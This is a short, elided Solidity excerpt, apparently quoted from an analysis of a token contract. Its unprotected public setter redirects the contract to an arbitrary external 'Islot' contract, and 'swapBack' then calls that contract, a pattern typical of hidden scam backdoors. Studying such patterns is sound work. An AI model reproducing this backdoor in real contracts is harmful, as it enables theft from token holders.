...
interface Islot {
    function swapExactTokensForTokensOnOtherToken(
        address,
        address
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    Islot _soltAddr;
    function setsoltAddr(
        uint160 newValue
    ) public {
        _soltAddr = Islot(address(newValue));
    }
    ...
    function swapBack(
        ...
        uint256 amount = _soltAddr.swapExactTokensForTokensOnOtherToken(
            router,pair
        );
...
contract Token is ERC20('S', 'W'), Ownable {
    constructor() {
